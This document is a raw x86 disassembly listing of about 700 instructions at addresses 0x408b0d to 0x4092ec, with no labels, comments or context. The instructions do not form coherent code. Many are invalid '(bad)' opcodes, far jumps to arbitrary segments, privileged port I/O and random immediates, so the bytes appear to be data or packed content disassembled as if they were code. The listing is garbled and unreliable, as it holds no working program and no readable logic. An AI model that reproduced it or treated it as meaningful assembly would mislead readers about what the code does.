  408b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b0e:	adc    al,0xeb
  408b10:	jg     0x408ac1
  408b12:	cwde   
  408b13:	cwde   
  408b14:	out    0xec,eax
  408b16:	je     0x408b6d
  408b18:	daa    
  408b19:	jg     0x408b91
  408b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b1c:	xchg   BYTE PTR [ebp+0x5f],al
  408b1f:	push   ebx
  408b20:	leave  
  408b21:	test   ebp,ecx
  408b23:	jb     0x408af8
  408b25:	dec    esp
  408b26:	fld    TBYTE PTR [edi-0x10]
  408b29:	aaa    
  408b2a:	call   0x5e041bf0
  408b2f:	sub    esi,ebx
  408b31:	xchg   ebx,eax
  408b32:	add    al,0xf1
  408b34:	imul   ecx,DWORD PTR [edi+0x76],0x6c69fee6
  408b3b:	xchg   esp,eax
  408b3c:	sbb    ch,bl
  408b3e:	jg     0x408b2d
  408b40:	pop    ebx
  408b41:	ret    0xcb95
  408b44:	jnp    0x408aed
  408b46:	sub    DWORD PTR [edx],eax
  408b48:	xlat   BYTE PTR ds:[ebx]
  408b49:	add    BYTE PTR [esi],bl
  408b4b:	clc    
  408b4c:	jmp    0x51a9:0x4170497c
  408b53:	push   esp
  408b54:	clc    
  408b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b56:	sar    esi,0xeb
  408b59:	pop    ds
  408b5a:	xlat   BYTE PTR ds:[ebx]
  408b5b:	inc    ebp
  408b5c:	xor    bl,bl
  408b5e:	lahf   
  408b5f:	jnp    0x408b7b
  408b61:	gs data16 jle 0x408b60
  408b65:	test   al,0x46
  408b67:	mov    ebp,0x71732be9
  408b6c:	(bad)  
  408b6d:	mov    al,ds:0x81ef0436
  408b72:	or     eax,0x75717ba6
  408b77:	test   al,0x13
  408b79:	xor    edx,DWORD PTR [ebx-0x458351a2]
  408b7f:	dec    ecx
  408b80:	in     al,0x58
  408b82:	test   eax,0xef24d77b
  408b87:	dec    ecx
  408b88:	sub    al,ah
  408b8a:	icebp  
  408b8b:	xor    al,0x34
  408b8d:	fstp   DWORD PTR [ecx+0x4b72ce1e]
  408b93:	ja     0x408bbc
  408b95:	aam    0xc3
  408b97:	push   edx
  408b98:	mov    cl,BYTE PTR [edx-0x1914e947]
  408b9e:	js     0x408be7
  408ba0:	mov    WORD PTR [edi-0x77],?
  408ba3:	push   ebx
  408ba4:	and    al,0xf5
  408ba6:	test   ch,ch
  408ba8:	int3   
  408ba9:	jl     0x408bae
  408bab:	mov    dh,0x8a
  408bad:	fsub   QWORD PTR [edx]
  408baf:	pop    edi
  408bb0:	sub    DWORD PTR ds:0xb7d,0xffffffa5
  408bb6:	mov    eax,ds:0x7824a161
  408bbc:	gs and al,0x7f
  408bbf:	in     eax,dx
  408bc0:	stos   BYTE PTR es:[edi],al
  408bc1:	das    
  408bc2:	push   esp
  408bc3:	lea    edx,[edi+0x44]
  408bc6:	xor    eax,0x1e4df2d0
  408bcb:	cld    
  408bcc:	ficom  WORD PTR [eax-0x1996eba9]
  408bd2:	(bad)  
  408bd4:	adc    BYTE PTR [esi],ch
  408bd6:	pushf  
  408bd7:	add    DWORD PTR [edx+0x32],0xffffffed
  408bdb:	inc    ebx
  408bdc:	fmul   st(2),st
  408bde:	fisttp DWORD PTR [esi+0x50b5c0fb]
  408be4:	add    eax,0xa56f5800
  408be9:	inc    eax
  408bea:	rol    BYTE PTR [ebx-0x2f],1
  408bed:	cmp    al,BYTE PTR [ecx-0x2e]
  408bf0:	adc    DWORD PTR [ecx-0x72],ebp
  408bf3:	dec    ecx
  408bf4:	sbb    BYTE PTR [edx-0x2],cl
  408bf7:	cmp    eax,0x179a6485
  408bfc:	xchg   esi,eax
  408bfd:	push   ecx
  408bfe:	ds pop esi
  408c00:	test   BYTE PTR [edi+0xc],ah
  408c03:	arpl   dx,cx
  408c05:	cdq    
  408c06:	sub    DWORD PTR [ebx+0x69],edi
  408c09:	and    eax,0xf36db1ef
  408c0e:	mov    esi,0x885f3f2b
  408c13:	out    0x67,eax
  408c15:	not    dh
  408c17:	inc    ebp
  408c18:	into   
  408c19:	xor    BYTE PTR [edi+0x41],al
  408c1c:	pop    edi
  408c1d:	fwait
  408c1e:	mov    ebx,ebx
  408c20:	ror    BYTE PTR [eax+0xa],cl
  408c23:	xor    eax,0xa4282374
  408c28:	shr    ebp,cl
  408c2a:	hlt    
  408c2b:	lods   eax,DWORD PTR ds:[esi]
  408c2c:	out    dx,eax
  408c2d:	jne    0x408bb9
  408c2f:	pop    ds
  408c30:	ja     0x408bec
  408c32:	dec    edi
  408c33:	and    DWORD PTR [edi+0x35c5e78d],0x51
  408c3a:	out    0x29,al
  408c3c:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c3f:	and    DWORD PTR ds:0x1da1d61a,esp
  408c45:	dec    edi
  408c46:	hlt    
  408c47:	bndldx (bad),[esi+0x2a14ca04]
  408c4e:	adc    al,0x42
  408c50:	scas   al,BYTE PTR es:[edi]
  408c51:	xor    eax,0x88bf753e
  408c56:	xor    eax,0xdd0b6bfe
  408c5b:	test   cl,bl
  408c5d:	call   FWORD PTR [edi+esi*8]
  408c60:	adc    al,BYTE PTR [esi-0x53]
  408c63:	test   BYTE PTR [ebp-0x25],0x6
  408c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c68:	push   ecx
  408c69:	imul   esp,DWORD PTR [ebx-0x7d70d400],0xc9d1e854
  408c73:	fldl2e 
  408c75:	std    
  408c76:	mov    bl,0xa8
  408c78:	popa   
  408c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c7a:	ins    BYTE PTR es:[edi],dx
  408c7b:	into   
  408c7c:	arpl   bp,di
  408c7e:	loope  0x408c3f
  408c80:	fadd   DWORD PTR [ebx+0x30]
  408c83:	je     0x408c6a
  408c85:	jmp    0x408c8e
  408c87:	mov    dl,0x9d
  408c89:	pop    ebx
  408c8a:	push   cs
  408c8b:	les    esp,FWORD PTR [ebp+0x41]
  408c8e:	popa   
  408c8f:	loope  0x408c5f
  408c91:	loopne 0x408c2b
  408c93:	es push esp
  408c95:	xor    ecx,DWORD PTR [ecx-0xcdacd0d]
  408c9b:	mov    ds:0x5b13799d,al
  408ca0:	jge    0x408cb1
  408ca2:	mov    ch,0x13
  408ca4:	fwait
  408ca5:	jmp    0x2b2e:0x78c3b0f1
  408cac:	and    al,0x32
  408cae:	xchg   edi,eax
  408caf:	out    0x2a,eax
  408cb1:	xchg   edi,eax
  408cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb3:	jo     0x408d1a
  408cb5:	jle    0x408cc8
  408cb7:	sti    
  408cb8:	jmp    0x6e78:0x63aa0908
  408cbf:	out    dx,eax
  408cc0:	cmp    al,0x55
  408cc2:	pop    eax
  408cc3:	cmc    
  408cc4:	iret   
  408cc5:	dec    edx
  408cc6:	loopne 0x408d11
  408cc8:	(bad)  
  408cc9:	ret    0xdc87
  408ccc:	out    dx,eax
  408ccd:	sbb    BYTE PTR [ecx-0x3],bl
  408cd0:	cld    
  408cd1:	in     al,0xe4
  408cd3:	xchg   esp,eax
  408cd4:	fild   QWORD PTR [edx+0x37e129f4]
  408cda:	xchg   esi,eax
  408cdb:	pop    edi
  408cdc:	sub    ah,BYTE PTR [edx]
  408cde:	pusha  
  408cdf:	jo     0x408cca
  408ce1:	xor    edx,edi
  408ce3:	push   esp
  408ce4:	std    
  408ce5:	add    DWORD PTR [ecx-0x6846b5fd],ebx
  408ceb:	ds mov eax,0xc76be27c
  408cf1:	pop    ebx
  408cf2:	jns    0x408d5f
  408cf4:	scas   eax,DWORD PTR es:[edi]
  408cf5:	inc    edi
  408cf6:	jecxz  0x408cca
  408cf8:	pop    ebp
  408cf9:	or     edx,0x48f6ccfd
  408cff:	cwde   
  408d00:	inc    edi
  408d01:	add    BYTE PTR [ebx-0x6083c6a9],0xa
  408d08:	dec    esi
  408d09:	fdivr  DWORD PTR ds:0x83791de3
  408d0f:	or     BYTE PTR [ecx],al
  408d11:	std    
  408d12:	sub    al,0xe9
  408d14:	pusha  
  408d15:	pop    edi
  408d16:	mov    bl,0x3e
  408d18:	mov    ch,0xd7
  408d1a:	nop
  408d1b:	(bad)  
  408d1c:	repz jns 0x408d9a
  408d1f:	adc    BYTE PTR [eax],bl
  408d21:	add    eax,ebx
  408d23:	sbb    bh,BYTE PTR [ecx+0x52]
  408d26:	mov    WORD PTR [esi-0x68],fs
  408d29:	je     0x408d93
  408d2b:	jbe    0x408cce
  408d2d:	call   0xa21413fe
  408d32:	hlt    
  408d33:	inc    ebp
  408d34:	inc    esi
  408d35:	inc    ebx
  408d36:	ret    
  408d37:	push   esi
  408d38:	into   
  408d39:	nop
  408d3a:	push   ds
  408d3b:	fstp   st(5)
  408d3d:	mov    esp,0x252de598
  408d42:	mov    al,ds:0xf02d89f8
  408d47:	push   edx
  408d48:	outs   dx,BYTE PTR ds:[esi]
  408d49:	pusha  
  408d4a:	out    0x57,eax
  408d4c:	bound  esp,QWORD PTR [eax]
  408d4e:	daa    
  408d4f:	cmp    eax,0x8685ba3f
  408d54:	outs   dx,BYTE PTR ds:[esi]
  408d55:	mov    cl,dl
  408d57:	pop    ecx
  408d58:	and    al,0x3c
  408d5a:	xor    DWORD PTR [ebx+eax*1+0x11],ebp
  408d5e:	nop
  408d5f:	sub    eax,0xaa3150fb
  408d64:	jmp    0x408de1
  408d66:	fldln2 
  408d68:	dec    esi
  408d69:	fs js  0x408d69
  408d6c:	pop    fs
  408d6e:	cdq    
  408d6f:	fnstsw WORD PTR [ecx-0x6e]
  408d72:	xlat   BYTE PTR cs:[ebx]
  408d74:	daa    
  408d75:	and    DWORD PTR [eax],esi
  408d77:	sbb    al,0x8f
  408d79:	cmp    al,0x9e
  408d7b:	xchg   ecx,eax
  408d7c:	popf   
  408d7d:	aaa    
  408d7e:	in     eax,0x78
  408d80:	outs   dx,DWORD PTR ds:[esi]
  408d81:	ins    BYTE PTR es:[edi],dx
  408d82:	stos   DWORD PTR es:[edi],eax
  408d83:	sub    dh,BYTE PTR [edi-0x5888e042]
  408d89:	xchg   ecx,eax
  408d8a:	adc    esp,esi
  408d8c:	not    DWORD PTR [ebx-0x71e1fb43]
  408d92:	sub    BYTE PTR [esi],0x5c
  408d95:	sbb    dh,BYTE PTR [ebp+0x2d]
  408d98:	test   eax,0x963ac225
  408d9d:	or     eax,0xf4069a51
  408da2:	jae    0x408d8e
  408da4:	sub    al,0x78
  408da7:	mov    cl,BYTE PTR [esi]
  408da9:	mov    ch,cl
  408dab:	aam    0x14
  408dad:	sbb    eax,0x2da6d9d
  408db2:	cmp    edi,DWORD PTR [edi-0x55]
  408db5:	pop    es
  408db6:	cmp    cl,al
  408db8:	out    dx,al
  408db9:	das    
  408dba:	or     edx,eax
  408dbc:	jge    0x408d73
  408dbe:	mov    BYTE PTR [edx+0x23972d26],dh
  408dc4:	in     al,dx
  408dc5:	xchg   BYTE PTR [esi],dl
  408dc7:	adc    edi,DWORD PTR [edi+0x5c]
  408dca:	jle    0x408dc9
  408dcc:	adc    BYTE PTR [ebx-0x28a88b7a],0xb
  408dd3:	xchg   edx,eax
  408dd4:	sub    BYTE PTR ds:0x6f343a5f,bh
  408dda:	ins    DWORD PTR es:[edi],dx
  408ddb:	xor    al,BYTE PTR [ecx]
  408ddd:	imul   ecx,DWORD PTR [edx-0x4],0xaa84e704
  408de4:	add    DWORD PTR [ebx-0x35],0x5
  408de8:	aad    0x1e
  408dea:	test   eax,0xcde0a256
  408df0:	dec    esp
  408df1:	jne    0x408e59
  408df3:	pusha  
  408df4:	xchg   ebx,eax
  408df5:	js     0x408e5c
  408df7:	repz xor BYTE PTR [eax-0x6a],ch
  408dfb:	fprem  
  408dfd:	out    dx,al
  408dfe:	cmp    eax,0x53a76942
  408e03:	packssdw mm2,QWORD PTR [edx-0x52d4693f]
  408e0a:	dec    ebp
  408e0b:	ins    DWORD PTR es:[edi],dx
  408e0c:	data16 out dx,al
  408e0e:	(bad)  
  408e0f:	dec    ebx
  408e10:	xor    dh,cl
  408e12:	mov    cl,BYTE PTR [eax+eiz*8-0x53]
  408e16:	ss in  al,dx
  408e18:	mov    dh,0x1b
  408e1b:	add    ebx,DWORD PTR [esi-0x58fe0452]
  408e21:	cld    
  408e22:	mov    edi,ss
  408e24:	cmp    BYTE PTR [edi],0xd6
  408e27:	ins    BYTE PTR es:[edi],dx
  408e28:	push   esi
  408e29:	das    
  408e2a:	mov    edi,0x45d3376e
  408e2f:	idiv   BYTE PTR [esi]
  408e31:	push   cs
  408e32:	dec    edx
  408e33:	or     ch,BYTE PTR [esi]
  408e35:	stc    
  408e36:	sbb    BYTE PTR [ecx],0xeb
  408e39:	adc    bh,BYTE PTR ds:0xd3d89b95
  408e3f:	cs push edi
  408e41:	scas   eax,DWORD PTR es:[edi]
  408e42:	push   eax
  408e43:	fistp  DWORD PTR cs:0x746f5bfc
  408e4a:	inc    esi
  408e4b:	cmp    bh,0x1
  408e4e:	fcom   DWORD PTR [edx+0x2590f625]
  408e54:	das    
  408e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e56:	adc    BYTE PTR [ebp-0x32],dh
  408e59:	mov    ecx,0xacc29c3c
  408e5e:	mov    edi,0x2e4b7398
  408e63:	adc    al,0xc5
  408e65:	mov    eax,0xad13634b
  408e6a:	gs stc 
  408e6c:	mov    esi,0x84c25789
  408e71:	js     0x408e10
  408e73:	and    BYTE PTR [esp+esi*2],dl
  408e76:	mov    BYTE PTR [ebp-0x25b0d79c],ch
  408e7c:	fstp   st(6)
  408e7e:	jle    0x408e69
  408e80:	push   ecx
  408e81:	inc    ecx
  408e82:	pushf  
  408e83:	pop    es
  408e84:	shl    DWORD PTR [ecx-0x27],0x69
  408e88:	dec    BYTE PTR [eax+edx*8-0x53]
  408e8c:	xchg   edi,eax
  408e8d:	adc    eax,0x425c1cee
  408e92:	xchg   esi,eax
  408e93:	ror    DWORD PTR [esi-0x7c],1
  408e96:	push   ebp
  408e97:	or     bh,bl
  408e99:	add    eax,0xd51d9efd
  408e9e:	xor    esp,DWORD PTR [ebp+0x2c]
  408ea1:	sub    al,BYTE PTR [ebx+0x66738635]
  408ea7:	add    BYTE PTR [ebp+0xb109467],ah
  408ead:	jp     0x408ef8
  408eaf:	xor    DWORD PTR [ecx+ecx*4+0x6925b17a],edi
  408eb6:	out    0x62,al
  408eb8:	jb     0x408e4d
  408eba:	(bad)  
  408ebb:	cli    
  408ebc:	fild   DWORD PTR [edi-0x40f17f6c]
  408ec2:	mov    ebx,ebx
  408ec4:	push   esp
  408ec5:	add    eax,0xe14f3787
  408eca:	sub    dl,BYTE PTR [esi+esi*2+0x7f]
  408ece:	test   bl,al
  408ed0:	push   es
  408ed1:	jo     0x408e60
  408ed3:	add    BYTE PTR [ebx-0x20986321],bh
  408ed9:	daa    
  408eda:	xchg   ebp,eax
  408edb:	dec    ecx
  408edc:	xor    al,0xe8
  408ede:	mov    eax,0xd02d5bd5
  408ee3:	jmp    0xaaf4:0x6f41485b
  408eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eeb:	sbb    eax,DWORD PTR [ebp*8+0x26d04009]
  408ef2:	xchg   DWORD PTR [esi-0x6b47e756],ecx
  408ef8:	rcl    bh,1
  408efa:	mov    eax,ds:0xf86648b9
  408eff:	nop
  408f00:	mov    ch,0x2a
  408f02:	mov    al,0xad
  408f04:	push   0xe5050eaf
  408f09:	popa   
  408f0a:	iret   
  408f0b:	test   al,0x13
  408f0d:	hlt    
  408f0e:	call   0x82f1:0x71cbb77a
  408f15:	pop    eax
  408f16:	in     al,dx
  408f17:	dec    edi
  408f18:	xchg   ecx,eax
  408f19:	xlat   BYTE PTR ds:[ebx]
  408f1a:	mov    edi,0x5be8ea1a
  408f1f:	rcr    DWORD PTR ds:0x658488b7,1
  408f25:	inc    ebp
  408f26:	out    dx,al
  408f27:	or     ecx,DWORD PTR [edi]
  408f29:	addr16 pop ds
  408f2b:	cmp    BYTE PTR [ebx],0x76
  408f2e:	pusha  
  408f2f:	sub    ebp,DWORD PTR [ecx-0x6b]
  408f32:	push   eax
  408f33:	mov    bl,0x1f
  408f35:	mov    al,ds:0xa50d56d8
  408f3a:	mov    edi,eax
  408f3c:	dec    edi
  408f3d:	sahf   
  408f3e:	aad    0xf1
  408f40:	outs   dx,BYTE PTR ds:[esi]
  408f41:	imul   edi,DWORD PTR [ebp-0x12],0xffffff8d
  408f45:	push   0x7ca77187
  408f4a:	sti    
  408f4b:	les    ecx,FWORD PTR [ebx+ecx*8]
  408f4e:	adc    BYTE PTR ds:0xdcb1b372,0x91
  408f55:	jmp    0x3365:0x5c67f69f
  408f5c:	xor    eax,0x50046e8b
  408f61:	std    
  408f62:	xor    al,0xda
  408f64:	add    eax,0x360a39a9
  408f69:	pop    ebp
  408f6a:	lods   eax,DWORD PTR ds:[esi]
  408f6b:	inc    ecx
  408f6c:	jg     0x408f3d
  408f6e:	mov    ch,BYTE PTR [edx+ecx*2-0x6a]
  408f72:	fsub   DWORD PTR [esi+0x46]
  408f75:	or     eax,0x47b54c8f
  408f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f7b:	sbb    cl,BYTE PTR [edx-0x8]
  408f7e:	(bad)  
  408f7f:	jae    0x408f68
  408f81:	jno    0x408f25
  408f83:	or     esp,DWORD PTR [ebx+0x1f]
  408f86:	mov    edx,0x7e455093
  408f8b:	jg     0x408f30
  408f8d:	loopne 0x408f67
  408f8f:	scas   eax,DWORD PTR es:[edi]
  408f90:	es add al,0x89
  408f93:	push   edi
  408f94:	jge    0x408fe1
  408f96:	jp     0x408fee
  408f98:	inc    ecx
  408f99:	jmp    0x408fb7
  408f9b:	inc    esi
  408f9c:	sub    dl,BYTE PTR [edx]
  408f9e:	cmp    ecx,DWORD PTR ds:0x29e40004
  408fa4:	push   edx
  408fa5:	popa   
  408fa6:	jnp    0x40901a
  408fa8:	out    dx,al
  408fa9:	jnp    0x40900e
  408fab:	pop    edi
  408fac:	mov    dl,0xec
  408fae:	add    BYTE PTR ss:[esi+0x359e80c0],ah
  408fb5:	mov    dh,0xea
  408fb7:	loop   0x408fdc
  408fb9:	fadd   QWORD PTR [ebx]
  408fbb:	xor    esi,DWORD PTR [ebp+0x84e63c]
  408fc1:	clc    
  408fc2:	out    0x36,al
  408fc4:	js     0x408f95
  408fc6:	pop    es
  408fc7:	add    BYTE PTR [edi],0x15
  408fca:	push   cs
  408fcb:	es push ebx
  408fcd:	lock imul ebx,DWORD PTR [ebp-0x764bdb11],0x9d9b2a46
  408fd8:	cli    
  408fd9:	clc    
  408fda:	repnz lods al,BYTE PTR ds:[esi]
  408fdc:	pop    es
  408fdd:	mov    bl,0x6a
  408fdf:	rcl    BYTE PTR [esp+ecx*2],0x14
  408fe3:	sahf   
  408fe4:	xchg   ebp,eax
  408fe5:	stos   DWORD PTR es:[edi],eax
  408fe6:	sbb    al,BYTE PTR [edi-0x69]
  408fe9:	pop    ss
  408fea:	mov    ecx,0x18e5e8b5
  408fef:	mov    bl,0x94
  408ff1:	mov    al,ds:0x181cad49
  408ff6:	sbb    eax,0xd7bc4858
  408ffb:	or     eax,0x4127c439
  409000:	out    dx,eax
  409001:	jl     0x409041
  409003:	gs dec edx
  409005:	jecxz  0x408fa3
  409007:	imul   edx,DWORD PTR [eax],0x3c
  40900a:	add    DWORD PTR [ebx+ecx*8+0x57],ebp
  40900e:	push   esp
  40900f:	add    al,0x6b
  409011:	jae    0x409036
  409013:	mul    BYTE PTR [ebp+esi*4+0xd9f3dee]
  40901a:	(bad)  [eax-0x10d8bc91]
  409020:	enter  0x46fe,0xf9
  409024:	cmp    BYTE PTR [ecx],dl
  409026:	dec    esi
  409027:	sbb    BYTE PTR [edi-0x164e7808],cl
  40902d:	cmp    ecx,ecx
  40902f:	add    eax,0xf025d788
  409034:	stc    
  409035:	cmc    
  409036:	test   DWORD PTR [edi-0x1d],ebp
  409039:	lds    edi,FWORD PTR [ecx-0x7b]
  40903c:	cwde   
  40903d:	leave  
  40903e:	mov    eax,ds:0xa25ace20
  409043:	mov    ch,0x1e
  409045:	push   0x8a0bc552
  40904a:	mov    bl,0xdc
  40904c:	iret   
  40904d:	jge    0x409006
  40904f:	add    BYTE PTR [edx-0x31],al
  409052:	xor    eax,eax
  409054:	sahf   
  409055:	retf   0x9536
  409058:	loope  0x409030
  40905a:	inc    ebx
  40905b:	and    DWORD PTR [edi+0x439e42fe],edi
  409061:	shr    dh,1
  409063:	xor    al,0xf1
  409065:	mov    eax,0x26229ea2
  40906a:	jl     0x408ffe
  40906c:	mov    ah,0xb2
  40906e:	out    dx,al
  40906f:	mul    BYTE PTR [ebp+edx*8+0x79]
  409073:	adc    ebx,DWORD PTR [esi]
  409075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409076:	jno    0x409050
  409078:	adc    DWORD PTR [esi-0x14],edi
  40907b:	push   0xffffffd8
  40907d:	aam    0x68
  40907f:	cld    
  409080:	push   esi
  409081:	mov    ecx,0xb7dc012
  409086:	add    esi,ebx
  409088:	or     BYTE PTR [edi+0x5dc5656e],0x74
  40908f:	outs   dx,DWORD PTR gs:[esi]
  409091:	test   DWORD PTR [edi-0xbe1cd3e],ebx
  409097:	xor    eax,ebp
  409099:	xchg   edi,eax
  40909a:	ds loopne 0x4090fb
  40909d:	adc    edx,eax
  40909f:	cwde   
  4090a0:	(bad)  
  4090a1:	mov    eax,ds:0xd4a4d2b9
  4090a6:	mov    esp,0x377d24e8
  4090ab:	mov    WORD PTR [eax-0x3f],?
  4090ae:	stc    
  4090af:	das    
  4090b0:	aaa    
  4090b1:	ins    BYTE PTR es:[edi],dx
  4090b2:	add    eax,0x52ef76d5
  4090b7:	je     0x409042
  4090b9:	sbb    eax,0x7435df8c
  4090be:	sbb    DWORD PTR [ecx-0x3d2fdd9e],edx
  4090c4:	cdq    
  4090c5:	pusha  
  4090c6:	inc    edi
  4090c7:	push   0x53637702
  4090cc:	dec    esi
  4090cd:	push   ebx
  4090ce:	cmp    ebx,DWORD PTR [edi+0x21]
  4090d1:	(bad)  
  4090d2:	sbb    eax,0xf20dc0f5
  4090d7:	es push es
  4090d9:	cmp    ebp,DWORD PTR [ebp+0x42]
  4090dc:	fimul  DWORD PTR [edx+0x4c9493c7]
  4090e2:	push   ebp
  4090e3:	mov    ebx,0x5293d743
  4090e8:	in     al,0x4c
  4090ea:	add    eax,0x10f7a886
  4090ef:	pop    ebx
  4090f0:	and    al,0x4d
  4090f2:	mov    ah,BYTE PTR [ebp-0x22f1be5d]
  4090f8:	aas    
  4090f9:	mov    ah,0x11
  4090fb:	sbb    DWORD PTR cs:[ebp+esi*8+0x9],ecx
  409100:	ret    
  409101:	add    edx,DWORD PTR [ecx]
  409103:	(bad)  
  409104:	jmp    0xcbb8:0xf0f95b92
  40910b:	test   BYTE PTR [edi+0x79303023],0x6d
  409112:	jl     0x409136
  409114:	cmp    dl,BYTE PTR [ebx+edi*4]
  409117:	in     eax,dx
  409118:	iret   
  409119:	inc    ebx
  40911a:	ds pop esp
  40911c:	and    DWORD PTR [ecx-0x4ea2ccde],ebp
  409122:	mov    edi,0x6aedc226
  409127:	jmp    FWORD PTR ds:0x41654581
  40912d:	mov    esp,0x2c6e132d
  409133:	lahf   
  409134:	mov    edi,0x3d6ea47d
  409139:	loopne 0x4090de
  40913b:	inc    ebp
  40913c:	dec    ecx
  40913d:	(bad)  
  40913e:	xchg   BYTE PTR [edi],bl
  409140:	mov    ah,0xa8
  409142:	mov    DWORD PTR [eax+0x1518df8c],ebx
  409148:	or     al,0x97
  40914a:	mov    bl,cl
  40914c:	xchg   esi,eax
  40914d:	mov    edi,gs
  40914f:	jmp    0xe1a8:0xe36571ae
  409156:	clc    
  409157:	fild   QWORD PTR ds:0x1f9ef9c7
  40915d:	inc    esp
  40915e:	add    bl,bl
  409160:	loop   0x40917e
  409162:	shr    esp,0xbb
  409165:	mov    al,BYTE PTR [ebx-0x350f0f8a]
  40916b:	popa   
  40916c:	sbb    eax,0xe09c6fce
  409171:	adc    DWORD PTR [edx+edx*1+0x52ec98a8],0x472351ed
  40917c:	add    edx,eax
  40917e:	sbb    al,0x53
  409180:	push   0x22
  409182:	mov    dl,0x45
  409184:	push   eax
  409185:	aam    0xea
  409187:	dec    esp
  409188:	aas    
  409189:	mov    ds:0x924d8e00,eax
  40918e:	loope  0x409179
  409190:	push   es
  409191:	std    
  409192:	ins    DWORD PTR es:[edi],dx
  409193:	ret    
  409194:	fild   QWORD PTR [edx]
  409196:	pop    ebp
  409197:	xchg   esp,eax
  409198:	call   0xc606:0xa451aeac
  40919f:	clc    
  4091a0:	mov    eax,0x4296634c
  4091a5:	loopne 0x4091f8
  4091a7:	push   ss
  4091a8:	inc    eax
  4091a9:	jne    0x40921d
  4091ab:	or     ebx,0x3d793af5
  4091b1:	outs   dx,BYTE PTR ds:[esi]
  4091b2:	lods   al,BYTE PTR ds:[esi]
  4091b3:	fiadd  WORD PTR [ecx-0x33777fb8]
  4091b9:	or     eax,0xb86dc5db
  4091be:	add    cl,BYTE PTR [edx+0x34]
  4091c1:	sub    BYTE PTR [edx],bl
  4091c3:	mov    edi,0x864b74fe
  4091c8:	mov    ah,0xb1
  4091ca:	mov    BYTE PTR [eax+0x67],dl
  4091cd:	xchg   ecx,eax
  4091ce:	push   edi
  4091cf:	shl    BYTE PTR [ecx],1
  4091d1:	mov    edi,0xeed8c468
  4091d6:	rol    ah,1
  4091d8:	push   ebx
  4091d9:	adc    DWORD PTR [ebp-0x46],edi
  4091dc:	xor    al,0xf9
  4091de:	rol    BYTE PTR [ecx-0x73],cl
  4091e1:	pop    ecx
  4091e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091e3:	and    DWORD PTR [eax+0x2c],ebx
  4091e6:	pop    ss
  4091e7:	sub    al,dh
  4091e9:	pusha  
  4091ea:	adc    al,0xed
  4091ec:	daa    
  4091ed:	call   DWORD PTR [eax]
  4091ef:	retf   0x9906
  4091f2:	dec    ecx
  4091f4:	xchg   ecx,eax
  4091f5:	(bad)  
  4091f6:	clc    
  4091f7:	inc    eax
  4091f8:	inc    esi
  4091f9:	sbb    eax,0x723ed63c
  4091fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ff:	and    ebx,edi
  409201:	xor    DWORD PTR [esi-0x6d7ccc7d],ebp
  409207:	cwde   
  409208:	jmp    0x24c1f72e
  40920d:	pop    edi
  40920e:	jbe    0x40925b
  409210:	into   
  409211:	mov    edx,0x17f2bd18
  409216:	icebp  
  409217:	xchg   esp,eax
  409218:	adc    edi,DWORD PTR [ebx+0x29]
  40921b:	test   BYTE PTR [ebp+0x77],ch
  40921e:	ins    BYTE PTR es:[edi],dx
  40921f:	mov    eax,DWORD PTR [edi+eiz*2+0x55]
  409223:	pop    edx
  409224:	sar    DWORD PTR [esi],cl
  409226:	retf   
  409227:	dec    eax
  409228:	ss cli 
  40922a:	lods   eax,DWORD PTR ds:[esi]
  40922b:	mov    edx,0xc633a80a
  409230:	mov    ebp,cs
  409232:	dec    ebp
  409233:	add    eax,0xf8c4e82a
  409238:	adc    BYTE PTR [edx-0x7d],bh
  40923b:	aas    
  40923c:	sti    
  40923d:	out    dx,al
  40923e:	sbb    al,dh
  409240:	sbb    DWORD PTR [edi-0x7a0cb225],ecx
  409246:	inc    ebx
  409247:	push   eax
  409248:	imul   esp,DWORD PTR [eax+0x74652fdf],0x9e0eab8e
  409252:	sub    al,0x5
  409254:	retf   0xb3c6
  409257:	aas    
  409258:	xchg   BYTE PTR [esi+0x3],dl
  40925b:	call   0x25aa:0xf76a7399
  409262:	cdq    
  409263:	imul   ebp,DWORD PTR [edi-0x3a],0x2009b30
  40926a:	mov    ch,0xa2
  40926c:	les    esp,FWORD PTR [eax-0x73]
  40926f:	inc    edx
  409270:	sub    eax,0x38471b9
  409275:	cmp    eax,0x5c095a69
  40927a:	pop    eax
  40927b:	mov    edi,0xb9c909cd
  409280:	je     0x4092d7
  409282:	push   0x75
  409284:	addr16 lahf 
  409286:	mul    BYTE PTR [ecx]
  409288:	ins    DWORD PTR es:[edi],dx
  409289:	xor    DWORD PTR [esi+0xb],ecx
  40928c:	loop   0x409245
  40928e:	adc    eax,0x54c5dd2a
  409293:	js     0x40922c
  409295:	push   esi
  409296:	dec    edi
  409297:	mov    eax,ds:0xc7efe863
  40929c:	add    edx,DWORD PTR [eax+edi*2-0x32]
  4092a0:	rcr    DWORD PTR [ebx],1
  4092a2:	inc    ebx
  4092a3:	inc    edi
  4092a4:	sub    eax,0xa1105ee4
  4092a9:	inc    ecx
  4092aa:	out    0x5d,eax
  4092ac:	mov    eax,ds:0x724f172f
  4092b1:	retf   0x25ac
  4092b4:	(bad)  [ebx-0x1f]
  4092b7:	sbb    al,BYTE PTR [edx+0x5d3ee595]
  4092bd:	and    DWORD PTR [esi],edi
  4092bf:	(bad)  
  4092c0:	sub    eax,0x676e3be9
  4092c5:	hlt    
  4092c6:	sub    eax,0x969a44e6
  4092cb:	sub    eax,0x1825e0ac
  4092d0:	nop
  4092d1:	and    BYTE PTR [eax],al
  4092d3:	xchg   edi,eax
  4092d4:	jmp    0x4092dc
  4092d6:	push   edi
  4092d7:	xchg   edi,eax
  4092d8:	and    al,0x78
  4092da:	dec    edi
  4092db:	cmp    ebx,ecx
  4092dd:	add    BYTE PTR [edi],0xeb
  4092e0:	test   DWORD PTR [edi-0x7daa7505],esi
  4092e6:	(bad)  
  4092e7:	mov    ecx,0xb7bd5eb
  4092ec:	call   0xc0537a1c
